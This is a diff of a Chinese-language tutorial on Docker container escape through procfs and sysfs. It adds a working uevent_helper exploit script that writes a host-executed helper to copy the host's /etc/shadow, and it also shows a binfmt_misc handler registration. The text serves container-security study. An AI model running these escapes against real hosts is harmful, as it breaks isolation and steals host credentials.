@@ -1,6 +1,33 @@
-## 利用procfs相关逃逸方式原理
+# 利用procfs/sysfs相关逃逸方式原理
 
-### 什么是procfs
+- [procfs相关逃逸方法](#procfs------)
+  * [procfs介绍](#procfs--)
+  * [利用/proc/sys/kernel/modprobe](#---proc-sys-kernel-modprobe)
+    + [modprobe相关解释](#modprobe----)
+    + [利用原理](#----)
+    + [EXP](#exp)
+  * [利用/proc/sys/kernel/core_pattern](#---proc-sys-kernel-core-pattern)
+    + [core_pattern相关解释](#core-pattern----)
+    + [利用原理](#-----1)
+    + [EXP](#exp-1)
+  * [利用/proc/sys/fs/binfmt_misc](#---proc-sys-fs-binfmt-misc)
+    + [什么是binfmt_misc](#---binfmt-misc)
+    + [逃逸原理](#----)
+    + [EXP](#exp-2)
+    + [在容器内直接触发不等待宿主机操作](#----------------)
+    + [修改解释器之后命令不能正常执行问题](#-----------------)
+- [sysfs相关逃逸方法](#sysfs------)
+  * [sysfs介绍](#sysfs--)
+  * [利用/sys/kernel/uevent_helper](#---sys-kernel-uevent-helper)
+    + [uevent_helper介绍](#uevent-helper--)
+    + [EXP](#exp-3)
+  * [利用/sys/fs/cgroup/devices/devices.allow](#---sys-fs-cgroup-devices-devicesallow)
+  * [利用/sys/fs/cgroup/*/release_agent](#---sys-fs-cgroup---release-agent)
+- [参考文档](#----)
+
+## procfs相关逃逸方法
+
+### procfs介绍
 
 procfs全称proc filesystem，比较简单的说就是将内核中保存的进程数据，以目录结构的形式进行展示，在系统启动阶段会被挂载到/proc目录，除进程数据外/proc目录也包含了一部分非进程数据如/proc/crypto、/proc/devices等，其中大部分目录都是数据接口，其中/proc/sys目录下包含了动态可配置的内核选项，可以通过修改/proc/sys目录下文件对内核进行动态配置。
 
@@ -8,7 +35,7 @@ procfs全称proc filesystem，比较简单的说就是将内核中保存的进�
 
 利用procfs进行容器逃逸使用到的内核相关特性都在/proc/sys下，可以参考：https://www.kernel.org/doc/html/v5.7/admin-guide/sysctl/ 确定每个文件对应的功能和使用方式
 
-除了procfs外在linux 2.6版本后将大量非进程相关的系统信息移动到一个专门的伪文件系统称为sysfs挂载在/sys目录下，另外一部分逃逸方式方式是通过sysfs完成的，这部分另外一篇文章进行介绍
+除了procfs外在linux 2.6版本后将大量非进程相关的系统信息移动到一个专门的伪文件系统称为sysfs挂载在/sys目录下，另外一部分逃逸方式方式是通过sysfs完成的，这部分在下边进行介绍
 
 ### 利用/proc/sys/kernel/modprobe
 
@@ -236,9 +263,46 @@ echo ":exp:M:240:\x70\xff\x01\x00::$host_path/tmp/handler.sh:" > /tmp/binfmt_mis
 ```
 ![](media/16423261310936/16446822121742.jpg)
     命令正常被执行
-    
-### 参考文档
+
+## sysfs相关逃逸方法
+
+### sysfs介绍
+
+### 利用/sys/kernel/uevent_helper
+
+#### uevent_helper介绍
+
+在linux中提供了udev和mdev这两个使用uevent机制处理热插拔问题的用户空间程序，udev基于netlink机制，依赖于系统启动的deamon进程systemd-udevd，这个进程监听内核发送的uevent信息去执行热拔插操作，mdev是基于uevent_helper机制，提供了/proc/sys/kernel/hotplug和/sys/kernel/uevent_helper接口用于设置对应的处理程序地址
+
+#### EXP
+
+不同的linux发行版使用的uevent机制是不同的，centos使用udev机制，所以没有/proc/sys/kernel/hotplug和/sys/kernel/uevent_helper接口，这里使用ubuntu 20.04.3进行测试`docker run -it --cap-add=SYS_ADMIN --security-opt=apparmor:unconfined ubuntu`
+
+```shell
+mount -o rw,remount /sys
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo '#!/bin/bash' > /tmp/test.sh
+echo "cat /etc/shadow > $host_path/shadow" >> /tmp/test.sh
+chmod +x /tmp/test.sh
+echo $host_path/tmp/test.sh > /sys/kernel/uevent_helper
+echo change > /sys/class/mem/null/uevent
+cat /shadow
+```
+
+![](media/16423261310936/16451810184955.jpg)
+
+### 利用/sys/fs/cgroup/devices/devices.allow
+
+参考之前的文章: [重写devices.allow逃逸方式原理](https://github.com/SPuerBRead/ddup/blob/master/Docker%E7%9B%B8%E5%85%B3/%E9%87%8D%E5%86%99devices.allow%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F/%E9%87%8D%E5%86%99devices.allow%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F.md)
+
+### 利用/sys/fs/cgroup/*/release_agent
+
+参考之前的文章: [notify_on_release逃逸方式原理](https://github.com/SPuerBRead/ddup/blob/master/Docker%E7%9B%B8%E5%85%B3/notify_on_release%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F/notify_on_release%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F%E5%8E%9F%E7%90%86.md)
+
+
+## 参考文档
 
 1. [Container escape in 2021](https://github.com/knownsec/KCon/blob/master/2021/Container%20escape%20in%202021.pdf)
 2. [sysctl-kernel](https://www.kernel.org/doc/html/latest/admin-guide/sysctl/kernel.html)    
 3. [Linux Kernel Exploitation Technique: Overwriting modprobe_path](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/)
+4. [sysfs(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sysfs.5.html)
